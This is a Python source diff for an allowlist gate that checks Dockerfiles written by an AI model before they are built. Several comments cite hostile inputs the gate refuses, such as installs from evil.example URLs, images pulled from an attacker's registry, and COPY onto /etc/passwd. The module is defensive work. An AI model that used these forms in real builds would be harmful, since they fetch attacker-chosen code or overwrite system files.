@@ -1,0 +1,223 @@
+"""The deterministic gate. Nothing reaches the daemon without passing this.
+
+An allowlist of permitted instructions, never a blocklist of forbidden ones. A
+blocklist is defeated by the first form nobody thought of, and the thing being
+checked was written by a model that had just read attacker-controlled text.
+
+Returns a reason to refuse, or None to allow. The reason is shown to the model as
+repair evidence, so it says what is wrong rather than merely that something is.
+"""
+
+from __future__ import annotations
+
+import json
+import re
+
+INSTRUCTIONS = ("FROM", "COPY", "RUN", "USER", "CMD", "ENTRYPOINT")
+
+# Characters Python's splitlines() treats as line breaks and Docker does not. With any
+# of them present the two disagree about what a line is, and every per-line rule below
+# is reasoning about a file Docker will never see. Refusing them outright is what makes
+# "one physical line is one instruction" true rather than nearly true.
+EXOTIC_BREAKS = "\v\f\x1c\x1d\x1e\x85\u2028\u2029"
+
+# RUN is exec form, so there is no shell and nothing to escape into. That is why this
+# is a list of argv heads rather than a list of string prefixes: `pip install` as a
+# string prefix also matches `pip install --index-url https://evil.example/ foo`.
+RUN_COMMANDS = (
+    ("pip", "install"),
+    ("pip3", "install"),
+    ("python", "-m", "pip", "install"),
+    ("apt-get", "update"),
+    ("apt-get", "install"),
+)
+
+RUN_FLAGS = frozenset({"-y", "--no-cache-dir", "--no-input", "--quiet"})
+
+# A package name, optionally with a version specifier. Deliberately narrow: it admits
+# `flask>=2.0,<4` and refuses `https://evil.example/x.tar.gz`, `git+https://...`,
+# `/app/x.deb`, and `--target`, all of which are ways to install something other than
+# a named package from the default index.
+PACKAGE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]*([<>=!~][^\s]*)?$")
+
+# Everything COPY writes lands here, so a Dockerfile cannot overwrite /etc/passwd or
+# shadow an interpreter on PATH with a file whose contents the attacker controls.
+COPY_DESTINATION = "/app/"
+
+
+def _reason(number: int, line: str, problem: str) -> str:
+    return f"line {number}, {line.strip()!r}: {problem}"
+
+
+def _check_from(number: int, line: str, base_image: str) -> str | None:
+    parts = line.split()
+    if len(parts) != 2:
+        # Catches multi-stage builds too. `FROM x AS builder` is four tokens, and a
+        # second stage can COPY --from= anything the first stage produced.
+        return _reason(number, line, "FROM takes exactly one image and nothing else")
+    reference = parts[1]
+    if reference != base_image:
+        return _reason(number, line,
+                       f"FROM must be the declared base_image {base_image!r}")
+    if "@" in reference:
+        # A digest pins harder than a tag but pins to one architecture, so an image
+        # that builds on arm64 fails on the amd64 runner.
+        return _reason(number, line, "pin with a tag, not a digest")
+    segments = reference.split("/")
+    if len(segments) > 2:
+        return _reason(number, line, "too many path segments for a Docker Hub image")
+    if len(segments) == 2 and ("." in segments[0] or ":" in segments[0]):
+        # `evil.attacker.com/img:1` is a valid reference, and building it would make
+        # the daemon pull from a host the attacker chose.
+        return _reason(number, line, "no registry host, Docker Hub images only")
+    name = segments[-1]
+    if ":" not in name:
+        return _reason(number, line, "FROM needs an explicit tag")
+    tag = name.rsplit(":", 1)[1]
+    if not tag:
+        return _reason(number, line, "FROM needs an explicit tag")
+    if tag == "latest":
+        return _reason(number, line, "latest is not a pin, name a version")
+    return None
+
+
+def _check_copy(number: int, line: str, allowed_files: frozenset[str]) -> str | None:
+    parts = line.split()
+    if len(parts) != 3:
+        return _reason(number, line, "COPY takes exactly a source and a destination")
+    source, destination = parts[1], parts[2]
+    if source not in allowed_files:
+        return _reason(number, line,
+                       f"COPY may only name {', '.join(sorted(allowed_files))}")
+    if not destination.startswith(COPY_DESTINATION):
+        # Only the source was checked until 2026-08-24, so `COPY s.py /etc/passwd` and
+        # `COPY s.py /usr/local/bin/python` both passed. The contents are attacker
+        # controlled either way, so this grants nothing new, but there is no reason a
+        # build should be able to choose where they land.
+        return _reason(number, line, f"COPY destination must be under {COPY_DESTINATION}")
+    return None
+
+
+def _check_run(number: int, line: str) -> str | None:
+    """RUN is exec form, which is what makes its arguments inspectable.
+
+    Shell form would be `/bin/sh -c "pip install x"`, so the only defence available is
+    banning shell metacharacters in a string. That ban is a proxy for "no shell will
+    interpret this", and it has collateral: `>` and `<` are redirection operators and
+    version-specifier operators at the same time, so `pip install "flask>=2.0"` is
+    refused for looking like a redirect. Exec form makes the proxy unnecessary, because
+    there is no shell, and it turns the command into a list we can check argument by
+    argument instead of a prefix we can only match against.
+    """
+    argv = _exec_form(number, line, "RUN")
+    if isinstance(argv, str):
+        return argv
+    prefix = next((p for p in RUN_COMMANDS if tuple(argv[:len(p)]) == p), None)
+    if prefix is None:
+        allowed = ", ".join(" ".join(p) for p in RUN_COMMANDS)
+        return _reason(number, line, f"RUN must be one of: {allowed}")
+    for argument in argv[len(prefix):]:
+        if argument in RUN_FLAGS:
+            continue
+        if argument.startswith("-"):
+            return _reason(number, line,
+                           f"the flag {argument!r} is not allowed. "
+                           f"Permitted: {', '.join(sorted(RUN_FLAGS))}")
+        if not PACKAGE.match(argument):
+            return _reason(number, line,
+                           f"{argument!r} is not a package name. Install named packages "
+                           "from the default index, not URLs, git references or paths")
+    return None
+
+
+def _exec_form(number: int, line: str, keyword: str) -> list[str] | str:
+    """The argv, or the reason it is not one.
+
+    Shell form re-splits inside `/bin/sh -c`, which is the string-versus-list problem
+    the sandbox already refuses to make with the docker command itself.
+    """
+    rest = line[len(keyword):].strip()
+    try:
+        parsed = json.loads(rest)
+    except json.JSONDecodeError:
+        return _reason(number, line,
+                       f'{keyword} must be exec form, a JSON array, '
+                       f'for example {keyword} ["pip", "install", "requests"]')
+    if not isinstance(parsed, list) or not parsed:
+        return _reason(number, line, f"{keyword} must be a non-empty JSON array")
+    if not all(isinstance(item, str) for item in parsed):
+        return _reason(number, line, f"{keyword} array must hold only strings")
+    return parsed
+
+
+def _check_exec_form(number: int, line: str, keyword: str) -> str | None:
+    result = _exec_form(number, line, keyword)
+    return result if isinstance(result, str) else None
+
+
+def check(dockerfile: str, base_image: str,
+          allowed_files: frozenset[str]) -> str | None:
+    """Allow, or say why not.
+
+    Continuations are refused before anything else, which is what makes every later
+    rule sound: with no continuations each physical line is a whole instruction, so a
+    per-line allowlist cannot be walked past by an instruction that starts on one line
+    and does its work on the next.
+    """
+    if not dockerfile.strip():
+        return "the Dockerfile is empty"
+    exotic = next((c for c in EXOTIC_BREAKS if c in dockerfile), None)
+    if exotic is not None:
+        return (f"the Dockerfile contains {exotic!r}, which Python counts as a line "
+                "break and Docker does not, so the two would read different files")
+
+    seen_from = False
+    seen_command = False
+
+    for number, line in enumerate(dockerfile.splitlines(), start=1):
+        if line.rstrip().endswith("\\"):
+            return _reason(number, line, "no line continuations, one instruction per line")
+        stripped = line.strip()
+        if stripped.startswith("#"):
+            if re.match(r"#\s*(escape|syntax)\s*=", stripped):
+                # A parser directive changes how Docker reads the rest of the file,
+                # including which character continues a line. Nothing legitimate here
+                # needs one, and it is attacker-controlled surface either way.
+                return _reason(number, line, "no parser directives")
+            continue
+        if not stripped:
+            continue
+
+        keyword = stripped.split(maxsplit=1)[0].upper()
+        if keyword not in INSTRUCTIONS:
+            return _reason(number, line,
+                           f"{keyword} is not allowed. Permitted: {', '.join(INSTRUCTIONS)}")
+        if keyword == "FROM":
+            if seen_from:
+                return _reason(number, line, "only one FROM, no multi-stage builds")
+            problem = _check_from(number, stripped, base_image)
+            if problem:
+                return problem
+            seen_from = True
+            continue
+        if not seen_from:
+            return _reason(number, line, "FROM must be the first instruction")
+
+        if keyword == "COPY":
+            problem = _check_copy(number, stripped, allowed_files)
+        elif keyword == "RUN":
+            problem = _check_run(number, stripped)
+        elif keyword == "USER":
+            problem = (None if len(stripped.split()) == 2
+                       else _reason(number, line, "USER takes exactly one name"))
+        else:
+            problem = _check_exec_form(number, stripped, keyword)
+            seen_command = seen_command or problem is None
+        if problem:
+            return problem
+
+    if not seen_from:
+        return "the Dockerfile has no FROM"
+    if not seen_command:
+        return "the Dockerfile has no CMD or ENTRYPOINT, so the image runs nothing"
+    return None
